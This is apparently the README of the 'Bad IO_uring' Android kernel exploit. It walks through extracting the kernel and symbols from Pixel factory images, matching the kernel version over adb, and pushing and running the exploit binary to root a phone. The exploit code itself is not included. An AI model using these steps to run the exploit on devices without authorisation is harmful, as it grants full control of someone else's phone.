# Bad IO_uring
## How to use the exploit
The exploit is written to support different versions of kernels. In order to port the exploit to a different kernel, you need to extract the symbol file of the target kernel.

The kernel could be extract from the factory image of the phone. For Pixels, download the factory image [here](https://developers.google.com/android/images).

After downloading the image, extract the image to get `boot.img` file. `boot.img` can be extracted with `tools/unpack_bootimg.py`.
```bash
python3 tools/unpack_bootimg.py --boot_img boot.img --out out
```
You will see the kernel at `out/kernel`


Now, with the kernel image, we can use [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) to extract kernel symbols from it.
```
./tools/vmlinux-to-elf/kallsyms-finder out/kernel > pixel.kallsyms
```

You have to make sure the `Version string` extracted in the symbol matches your phone's kernel version. The kernel version of the phone could be looked up through `adb`. For example,

```
sh-3.2$ adb shell
oriole:/ $ uname -a
Linux localhost 5.10.66-android12-9-00007-g66c74c58ab38-ab8262750 #1 SMP PREEMPT Mon Mar 7 01:27:36 UTC 2022 aarch64
```
matches 
```
[+] Version string: Linux version 5.10.66-android12-9-00007-g66c74c58ab38-ab8262750 (build-user@build-host) (Android (7284624, based on r416183b) clang version 12.0.5 (https://android.googlesource.com/toolchain/llvm-project c935d99d7cf2016289302412d708641d52d2f7ee), LLD 12.0.5 (/buildbot/src/android/llvm-toolchain/out/llvm-project/lld c935d99d7cf2016289302412d708641d52d2f7ee)) #1 SMP PREEMPT Mon Mar 7 01:27:36 UTC 2022
```

Now you can push the exploit and the symbol file to the phone and get it rooted with the following commands.

```bash
make
adb push exp pixel.kallsyms /data/local/tmp
adb shell
cd /data/local/tmp
./exp pixel.kallsyms
```

